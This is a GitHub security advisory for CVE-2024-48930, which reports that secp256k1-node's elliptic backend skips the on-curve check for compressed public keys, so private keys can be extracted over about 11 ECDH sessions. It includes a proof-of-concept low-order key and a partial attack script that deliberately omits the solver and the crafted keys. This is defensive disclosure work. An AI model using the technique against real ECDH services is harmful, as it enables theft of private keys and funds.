# [H] secp256k1-node allows private key extraction over ECDH

## Summary
Severity: High
Chain: secp256k1
Component: secp256k1, secp256k1, secp256k1
CVE: CVE-2024-48930
CWE: Exposure of Sensitive Information to an Unauthorized Actor, Improper Validation of Integrity Check Value
Published: 2024-10-21
Source: https://github.com/advisories/GHSA-584q-6j8j-r5pm
Type: github-advisory

## Details
### Summary

In `elliptic`-based version, `loadUncompressedPublicKey` has a check that the public key is on the curve: https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39

`loadCompressedPublicKey` is, however, missing that check: https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19

That allows the attacker to use public keys on low-cardinality curves to extract enough information to fully restore the private key from as little as 11 ECDH sessions, and very cheaply on compute power

Other operations on public keys are also affected, including e.g. `publicKeyVerify()` incorrectly returning `true` on those invalid keys, and e.g. `publicKeyTweakMul()` also returning predictable outcomes allowing to restore the tweak 

### Details

The curve equation is `Y^2 = X^3 + 7`, and it restores `Y` from `X` in `loadCompressedPublicKey`, using `Y = sqrt(X^3 + 7)`, but when there are no valid `Y` values satisfying `Y^2 = X^3 + 7` for a given `X`, the same code calculates a solution for `-Y^2 = X^3 + 7`, and that solution also satisfies some other equation `Y^2 = X^3 + D`, where `D` is not equal to 7 and might be on a curve with factorizable cardinality, so `(X,Y)` might be a low-order point on that curve, lowering the number of possible ECDH output values to bruteforcable

Those output values correspond to remainders which can be then combined with Chinese remainder theorem to restore the original value

Endomorphism-based multiplication only slightly hinders restoration and does not affect the fact that the result is low-order

10 different malicious X values could be chosen so that the overall extracted information is 238.4 bits out of 256 bit private key, and the rest is trivially bruteforcable with an additional 11th public key (which might be valid or not -- not significant)

The attacker does not need to _receive_ the ECDH value, they only need to be able to confirm it against a list of possible candidates, e.g. check if using it to decipher block/stream cipher would work -- and that could all be done locally on the attacker side

### PoC

#### Example public key

This key has order 39
One of the possible outcomes for it is a throw, 38 are predictable ECDH values
Keys used in full attack have higher order (starting from ~20000), so are very unlikely to cause an error

```js
import secp256k1 from 'secp256k1/elliptic.js'
import { randomBytes } from 'crypto'

const pub = Buffer.from('028ac57f9c6399282773c116ef21f7394890b6140aa6f25c181e9a91e2a9e3da45', 'hex')

const seen = new Set()
for (let i = 0; i < 1000; i++) {
  try {
    seen.add(Buffer.from(secp256k1.ecdh(pub, randomBytes(32))).toString('hex'))
  } catch {
    seen.add('failure also is an outcome')
  }
}

console.log(seen.size) // 39
```

#### Full attack
This PoC doesn't list the exact public keys or the code for `solver.js` intentionally, but this exact code works, on arbitrary random private keys:

```js
// Only the elliptic version is affected, gyp one isn't
// Node.js can use both, Web/RN/bundles always use the elliptic version
import secp256k1 from 'secp256k1/elliptic.js'

import { randomBytes } from 'node:crypto'
import assert from 'node:assert/strict'
import { Solver } from './solver.js'

const privateKey = randomBytes(32)

// The full dataset is precomputed on a single MacBook Air in a few days and can be reused for any private key
const solver = new Solver

// We need to run on 10 specially crafted public keys for this
// Lower than 10 is possible but requires more compute
for (let i = 0; i < 10; i++) {
  const letMeIn = solver.ping() // this is a normal 33-byte Uint8Array, a 02/03-prefixed compressed public key
  assert(letMeIn instanceof Uint8Array) // true
  assert(secp256k1.publicKeyVerify(letMeIn)) // true

  // Returning ecdh value is not necessary but is used in this demo for simplicity
  // Solver needs to _confirm_ an ecdh value against a set of precalculated known ones,
  // which can be done even after it's hashed or used e.g. for a stream/block cipher, based on the encrypted data
  solver.callback(secp256k1.ecdh(letMeIn, privateKey))

  // Btw we have those precomputed so we can actually use those sessions to lower suspicion, most -- instantly
}

// Now, we need a single valid (or another invalid) public key to recheck things against
// It can be anything, e.g. we can specify an 11th one, or create a valid one and use it
// We'll be able to confirm/restore and use the ecdh value for this session too upon privateKey extraction
const anyPublicKey = secp256k1.publicKeyCreate(randomBytes(32))
assert(secp256k1.publicKeyVerify(anyPublicKey)) // true (obviously)

// Full complexity of this exploit requires solver to perform ~ 2^35 ecdh value checks (for all 10 keys combined),
// which is ~ 1 TiB -- that can be done offline and does not require any further interaction with the target
// The exact speed of the comparison step depends on how the ecdh values are used, but is not very significant
// Direct non-indexed linear scan over all possible (precomputed) values takes <10 minutes on a MacBook Air
// Confirming against e.g. cipher output would be somewhat slower, but still definitely possible + also could be precomputed
const extracted = solver.stab(anyPublicKey, secp256k1.ecdh(anyPublicKey, privateKey))

console.log(`Extracted private key:  ${extracted.toString('hex')}`)
console.log(`Actual private key was: ${privateKey.toString('hex')}`)

assert(extracted.toString('hex') === privateKey.toString('hex'))

console.log('Oops')
```

Result:
```console
Extracted private key:  e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d
Actual private key was: e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d
Oops
node example.js  178.80s user 13.59s system 74% cpu 4:17.01 total
```

### Impact

Remote private key is extracted over 11 ECDH sessions

The attack is very low-cost, precompute took a few days on a single MacBook Air, and extraction takes ~10 minutes on the same MacBook Air

Also:
* `publicKeyVerify()` misreports malicious public keys as valid
* Same affects tweak extraction from `publicKeyTweakMul` result and other public key operations
